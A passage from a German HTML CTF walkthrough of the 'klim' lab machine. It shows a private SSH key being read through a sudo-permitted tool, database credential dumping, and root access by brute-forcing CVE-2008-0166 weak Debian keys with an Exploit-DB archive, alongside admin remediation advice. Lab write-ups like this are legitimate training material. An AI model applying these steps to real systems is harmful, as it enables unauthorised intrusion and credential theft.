+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+[...] <span class="comment"><!-- Privater Schlüssel von klim --></span>
+-----END OPENSSH PRIVATE KEY----- <span class="comment"><!-- Korrigiert: OPENSSH --></span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Das `tool` wird mit `sudo -u klim` ausgeführt, und der Pfad zum privaten SSH-Schlüssel von `klim` (`/home/klim/.ssh/id_rsa`) wird als Argument übergeben. Das Tool gibt den Inhalt des privaten Schlüssels auf der Konsole aus.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Das `tool` fungiert als eine Art `cat`-Befehl oder Dateileser, der mit den Rechten des Zielbenutzers (`klim`) ausgeführt wird. Der private SSH-Schlüssel von `klim` wurde kompromittiert.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Speichern Sie den privaten Schlüssel von `klim`. Verwenden Sie ihn, um sich per SSH als `klim` anzumelden.<br><strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist extrem gefährlich. Erlauben Sie niemals die Ausführung von benutzerdefinierten Tools oder Tools mit Dateilesefunktionen als andere Benutzer, wenn der ausführende Benutzer den Pfad kontrollieren kann. Benennen Sie das Tool um oder entfernen Sie es. Entfernen Sie die `sudo`-Regel.</p>
+        </section>
+
+        <section id="ssh-access-klim">
+            <h2>SSH Access (klim) & Enumeration</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">chmod 600 klim.id_rsa</span></div> <span class="comment"><!-- Annahme: Schlüssel wurde als klim.id_rsa gespeichert --></span>
+                    <pre>[Berechtigungen gesetzt]</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">ssh klim@klim.hmv -i klim.id_rsa</span></div>
+                    <pre>
+Linux klim 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
+[...]
+Last login: Sun Jul 25 12:19:50 2021 from 192.168.0.28
+<span class="prompt" style="color: yellow;">klim@klim:~$</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der zuvor extrahierte private SSH-Schlüssel von `klim` wird verwendet, um eine SSH-Verbindung als Benutzer `klim` herzustellen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreicher Login als `klim`.</p>
+
+             <p class="analysis"><strong>Enumeration als `klim`:</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">klim@klim:~$</span> <span class="command">sudo -l</span></div>
+                     <pre>
+[...]
+[sudo] Mot de passe de klim : <span class="comment">[Passwort erforderlich]</span>
+</pre>
+                     <div class="prompt" style="color: yellow;">klim@klim:~$</span> <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>[...] <span class="comment"><!-- Standard SUID Binaries --></span></pre>
+                     <div class="prompt" style="color: yellow;">klim@klim:~$</span> <span class="command">cat /etc/*rel*</span></div>
+                     <pre>
+PRETTY_NAME="Debian GNU/Linux 10 (buster)"
+[...]
+</pre>
+                     <div class="prompt" style="color: yellow;">klim@klim:~$</span> <span class="command">uname -a</span></div>
+                     <pre>Linux klim 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux</pre>
+                     <div class="prompt" style="color: yellow;">klim@klim:~$</span> <span class="command">env</span></div>
+                     <pre>[...] LANG=fr_FR.UTF-8 [...]</pre>
+                     <div class="prompt" style="color: yellow;">klim@klim:~$</span> <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">2fbef74059deaea1e5e11cff5a65b68e</span></pre>
+                     <div class="prompt" style="color: yellow;">klim@klim:~$</span> <span class="command">ss -tuloe</span></div>
+                     <pre>[...] tcp LISTEN 0 80 127.0.0.1:mysql [...]</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Standard-Enumerationsschritte als `klim`:
+                 *   `sudo -l`: Erfordert Passwort.
+                 *   SUID-Suche: Keine ungewöhnlichen Funde.
+                 *   OS-Info: Debian 10, Kernel 4.19.0.
+                 *   Umgebungsvariablen: `LANG` ist auf Französisch gesetzt.
+                 *   User-Flag: Erfolgreich gelesen.
+                 *   Netzwerk-Sockets: Bestätigt lauschende Dienste (SSH, MySQL auf localhost, HTTP).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Keine direkten `sudo`-Rechte. User-Flag erhalten. Systeminformationen für Exploit-Suche notiert.</p>
+
+              <p class="analysis"><strong>Datenbank-Zugriff als `klim`:</strong></p>
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">klim@klim:~$</span> <span class="command">mysql -u wordpress_user -p</span></div>
+                     <pre>
+Enter password: <span class="password">Tropicano123!</span>
+[...]
+<span class="prompt" style="color: gold;">MariaDB [(none)]></span> <span class="command">show databases;</span>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| wordpress_db       |
++--------------------+
+<span class="prompt" style="color: gold;">MariaDB [(none)]></span> <span class="command">use wordpress_db;</span>
+Database changed
+<span class="prompt" style="color: gold;">MariaDB [wordpress_db]></span> <span class="command">show tables;</span>
++------------------------+
+| Tables_in_wordpress_db |
++------------------------+
+[...] | wp_users               | [...]
++------------------------+
+<span class="prompt" style="color: gold;">MariaDB [wordpress_db]></span> <span class="command">select * from wp_users;</span>
++----+------------+------------------------------------+---------------+----------------+-------------------------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email     | user_url                      | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+----------------+-------------------------------+---------------------+---------------------+-------------+--------------+
+|  1 | klim       | <span class="password">$P$B/EL8AVNDfGeYvQqnsCbn2o7G2urQi/</span> | klim          | klim@gmail.com | http://192.168.0.26/wordpress | 2021-07-24 10:29:28 |                     |           0 | klim         |
++----+------------+------------------------------------+---------------+----------------+-------------------------------+---------------------+---------------------+-------------+--------------+
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> `klim` loggt sich mit den bekannten WordPress-Datenbank-Credentials (`wordpress_user:Tropicano123!`) in MySQL ein. Die `wp_users`-Tabelle wird ausgelesen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Benutzer `klim` und dessen Passwort-Hash (`$P$B...` -> PHPass-Format, verwendet von älteren WordPress-Versionen oder portablen Hashes). Dieser Hash ist schwer offline zu knacken.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Datenbankzugriff liefert hier keine neuen, verwertbaren Zugangsdaten. Suchen Sie nach anderen Eskalationsvektoren.<br><strong>Empfehlung (Admin):</strong> Beschränken Sie den Datenbankzugriff auf das Notwendigste. Verwenden Sie separate Datenbankbenutzer für verschiedene Anwendungen.</p>
+
+              <p class="analysis"><strong>Suche nach SSH-Schlüsseln:</strong></p>
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">klim@klim:~$</span> <span class="command">cd /opt/</span></div>
+                     <div class="prompt" style="color: yellow;">klim@klim:/opt$</span> <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+-rw-r--r--  1 root root  391 juil. 24  2021 <span class="command">id_rsa.pub</span>
+</pre>
+                     <div class="prompt" style="color: yellow;">klim@klim:/opt$</span> <span class="command">cat id_rsa.pub</span></div>
+                     <pre>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA1bWurED/[...] root@klim</pre>
+                     <div class="prompt" style="color: yellow;">klim@klim:/opt$</span> <span class="command">find / -type f -name *rsa* 2>/dev/null</span></div>
+                     <pre>
+/opt/id_rsa.pub
+/home/klim/.ssh/id_rsa.pub
+</pre>
+                     <div class="prompt" style="color: yellow;">klim@klim:/opt$</span> <span class="command">ssh-keygen -l -f id_rsa.pub</span></div>
+                     <pre>2048 SHA256:k70roJKrxWXDX3ceR1RZKyRUoVTtf4KtDlfr2GJzAwo root@klim (RSA)</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Im Verzeichnis `/opt` wird ein öffentlicher SSH-Schlüssel (`id_rsa.pub`) gefunden, der `root` gehört und mit `root@klim` kommentiert ist. Eine Suche nach `*rsa*` findet nur diesen und den öffentlichen Schlüssel von `klim`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der Fund des öffentlichen Root-Schlüssels ist interessant. Der Fingerprint wird extrahiert. Dies könnte auf eine bekannte Schwachstelle im Zusammenhang mit schwachen SSH-Schlüsseln hindeuten.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchieren Sie nach bekannten Schwachstellen im Zusammenhang mit schwachen SSH-Schlüsseln unter Debian, insbesondere CVE-2008-0166 (OpenSSL Predictable PRNG). Vergleichen Sie den Fingerprint mit bekannten schwachen Schlüsseln.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Systeme gepatcht sind und keine bekannten schwachen Schlüssel verwenden. Speichern Sie keine Schlüssel an ungewöhnlichen Orten wie `/opt`.</p>
+
+        </section>
+
+        <section id="privesc-root-poc">
+             <h2>Privilege Escalation (klim zu root - POC)</h2>
+             <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung der Debian OpenSSL Predictable PRNG Schwachstelle (CVE-2008-0166), um den privaten SSH-Schlüssel des Root-Benutzers zu finden und sich als Root anzumelden.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 *   Shell als `klim`.
+                 *   Das Zielsystem muss eine verwundbare Debian-Version mit dem fehlerhaften OpenSSL-Paket sein (Debian 4.0 Etch, frühe Versionen von 5.0 Lenny; Ubuntu 7.04 - 8.04). Obwohl das System als Debian 10 identifiziert wurde, könnte der SSH-Schlüssel von einer älteren Installation stammen oder die Schwachstelle aus anderen Gründen bestehen.
+                 *   Zugriff auf eine Datenbank mit vorab generierten schwachen Schlüsseln (z.B. `exploitdb-bin-sploits/5622.tar.bz2`).
+                 *   Ein Tool zum Testen der Schlüssel gegen den SSH-Server (hier `opensslHack.py`, Herkunft unklar).
+             </p>
+             <p class="recommendation"><strong>Risiko:</strong> Kritisch. Erlaubt die Kompromittierung des Root-SSH-Zugangs, wenn ein schwacher Schlüssel verwendet wird.</p>
+
+            <p class="analysis"><strong>Schritt 1: Exploit-Datenbank herunterladen (Angreifer)</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2</span></div>
+                     <pre>[...]
+2022-11-07 00:15:52 (12,0 MB/s) - 5622.tar.bz2 gespeichert [50226987/50226987]
+</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">tar xfv 5622.tar.bz2</span></div>
+                      <pre>rsa/
+rsa/2048/
+rsa/2048/2712a6d5cec99f295a0c468b830a370d-28940.pub
+[...]
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Das Archiv `5622.tar.bz2` von Exploit-DB wird heruntergeladen und entpackt. Es enthält eine Sammlung von bekannten schwachen SSH-Schlüsseln (RSA, 2048 Bit), die aufgrund von CVE-2008-0166 generiert wurden.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die notwendige Datenbank schwacher Schlüssel ist nun lokal verfügbar.</p>
+
+            <p class="analysis"><strong>Schritt 2: Exploit-Skript vorbereiten (Angreifer)</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">vi opensslHack.py</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">chmod +x opensslHack.py</span></div>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein Python-Skript namens `opensslHack.py` wird erstellt oder bearbeitet und ausführbar gemacht. Der Inhalt ist nicht gezeigt, aber es handelt sich vermutlich um ein Skript, das die schwachen Schlüssel aus dem entpackten Verzeichnis lädt und versucht, sich damit per SSH als `root` beim Ziel anzumelden.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Das Werkzeug zum Testen der schwachen Schlüssel ist vorbereitet.</p>
+
+            <p class="analysis"><strong>Schritt 3: Schwache Schlüssel testen</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">python2 opensslHack.py rsa/2048 klim.hmv root 22 5</span></div>
+                     <pre>
+[...]
+Tested 295 keys | Remaining 32473 keys | Aprox. Speed 59/sec
+[...]
+<span class="password">Key Found in file: 54701a3b124be15d4c8d3cf2da8f0139-2005</span>
+Execute: ssh -lroot -p22 -i rsa/2048/54701a3b124be15d4c8d3cf2da8f0139-2005 klim.hmv
+[...]
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Das Skript `opensslHack.py` wird mit Python 2 ausgeführt. Es erhält den Pfad zu den schwachen Schlüsseln (`rsa/2048`), das Ziel (`klim.hmv`), den Benutzernamen (`root`), den Port (`22`) und vermutlich die Anzahl der Threads (`5`). Das Skript testet die Schlüssel durch.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Das Skript findet einen passenden privaten Schlüssel (`rsa/2048/54701a3b124be15d4c8d3cf2da8f0139-2005`) aus der Datenbank, der zum öffentlichen Schlüssel des Root-Benutzers auf dem Zielsystem passt.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den gefundenen privaten Schlüssel, um sich als `root` per SSH anzumelden.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine schwachen SSH-Schlüssel verwendet werden, die aus CVE-2008-0166 resultieren. Generieren Sie alle Schlüssel auf nicht betroffenen Systemen neu. Erneuern Sie den Root-SSH-Schlüssel.</p>
+
+            <p class="analysis"><strong>Schritt 4: SSH-Login als Root</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">ssh -lroot -p22 -i rsa/2048/54701a3b124be15d4c8d3cf2da8f0139-2005 klim.hmv</span></div>
+                     <pre>
+Linux klim 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
+[...]
+Last login: Wed Jul 28 10:18:38 2021
+<span class="prompt" style="color: red;">root@klim:~#</span> <span class="command">ls</span>
+root.txt
+<span class="prompt" style="color: red;">root@klim:~#</span> <span class="command">cat root.txt</span>
+<span class="password">60667e12c8ea62295de82d053d950e1f</span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der SSH-Login als `root` wird mit dem gefundenen schwachen privaten Schlüssel durchgeführt.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Login als `root` gelingt. Die Root-Flag wird aus `/root/root.txt` gelesen.</p>
+              <p class="recommendation"><strong>Empfehlung (Admin):</strong> Erneuern Sie den kompromittierten Root-SSH-Schlüssel und entfernen Sie den entsprechenden Eintrag aus `/root/.ssh/authorized_keys` (falls vorhanden).</p>
+         </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/klim/user.txt</div>
+                     <div class="flag-value"><span class="password">2fbef74059deaea1e5e11cff5a65b68e</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">60667e12c8ea62295de82d053d950e1f</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 06. November 2022</p>
+    </footer>
+</body>
+</html>
